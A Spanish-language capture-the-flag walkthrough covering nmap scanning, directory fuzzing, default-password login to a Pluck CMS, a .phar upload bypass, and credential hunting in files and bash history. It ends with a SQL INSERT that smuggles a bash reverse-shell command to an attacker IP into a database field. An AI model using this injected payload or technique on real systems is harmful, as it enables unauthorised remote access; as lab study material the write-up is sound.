### nmap
```python
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 76:26:67:a6:b0:08:0e:ed:34:58:5b:4e:77:45:92:57 (RSA)
|   256 52:3a:ad:26:7f:6e:3f:23:f9:e4:ef:e8:5a:c8:42:5c (ECDSA)
|_  256 71:df:6e:81:f0:80:79:71:a8:da:2e:1e:56:c4:de:bb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.87 seconds
```
### ports: 22/ssh - 80/http

### empezamos enumerando el puerto 80
![[Pasted image 20231121122855.png]]
en este caso parece que no tenemos mucho
### Fuzzing con gobuster
![[Pasted image 20231121123528.png]]
### tenemos un directorio llamado app. en el que encontramos una carpeta llamada pluck
![[Pasted image 20231121123646.png]]
### nos lleva a lo que parece ser la pagina principal
![[Pasted image 20231121123850.png]]
### aquí podemos enumerar el framework en el que esta echo la pagina y también un usuario admin
### si entramos en admin nos dirige a una pagina donde podremos logearnos pero aun no tenemos credenciales. lo que si podemos conseguir es lo que parece ser la version del framework y este lo podemos usar para buscar exploit que nos ayuden a entrar en la pagina
![[Pasted image 20231121124556.png]]
### despues de una busqueda en internet hemos encontrado un script que no funciona pero leyendo el codigo hemos descubierto que la clave que utiliza para ingresar a la pagina es password
### enumerando todos las rutas de la pagina parece que tenemos un apartado que nos permite subir archivos
![[Pasted image 20231121134946.png]]
### intentaremos subir un archivo que contenga una revershell 
### despues de hacer un monton de pruebas parece que la pagina agrega .txt a cada archivo que subimos asi que intentamos baypassar esto probando muchas opciones y phar nos ha funcionado
![[Pasted image 20231121145707.png]]
### nos ponemos a la escucha y recibimos nuestra shell
![[Pasted image 20231121145905.png]]
### Despues de hacer tratamiento de tty vamos al directorio /home
![[Pasted image 20231121151554.png]]
### dentro del directorio /home tenemos tres usuarios 
```python
	Username: death
	
	username: lucien
	
	username morpheus
```

### en este caso primero vamos a intentar enumerar al usuario morpheus, donde podemos ver la flag pero no tenemos permisos. y tambien tenemos un archivo restore.py muy interesante

![[Pasted image 20231121152552.png]]
### si hacemos un cat al archivo restore.py no tenemos mucha informacion asi que iremos por otro usuario

![[Pasted image 20231121153245.png]]

### despues de una larga busqueda e intentando muchisimas cosas entre ellas pspy64 el cual no se puede ejecutar debido a un archivo en el sistema que lo impide hemos encontrado esto:
![[Pasted image 20231121162834.png]]
### en el directorio opt existe un archivo llamado test.py y haciendo un cat podemos ver que al parecer contiene la contraseña del usuario lucien 

![[Pasted image 20231121163324.png]]
### efectivamente el archivo test.py contenia las credenciales de lucien
### hacemos cat al archivo getDreams.py
![[Pasted image 20231121163711.png]]
### obtenemos información sobre una base de datos mysql. este archivo parese mostrarnos lo que esta alojado en la base de datos. esto es muy importante ya que podremos usarlo mas adelante
### vamos a intentar buscar el bash_history del usuario lucien para intentar recopilar mas informacion
![[Pasted image 20231121172038.png]]
### genial. optenemos informacion valiosa. al parecer lucien se ha conectado en el pasado a la base de datos usando las credenciales que quedaron almacenadas en el bash_history. vamos a aprovechar esto para conectarnos a la base de datos y ver que tipo de informacion podemos sacar...
![[Pasted image 20231121181702.png]]
### vamos a mirar en toda la base de datos
![[Pasted image 20231121212309.png]]
### nos aprovecharemos del archivo que mencionamos anteriormente el cual hace un llamado de todo lo que esta en la base de datos e intentaremos inyectar una shell a la base de datos para que cuando ejecutemos el archivo con suerte esto nos envie una shell
### vamos a inyectar codigo a la base de datos
```python
	INSERT into dreams (dreamer,dream) VALUE ("Gamuke","; bash -c "bash -i >& /dev/tcp/10.8.203.6/9001 0>&1"")
```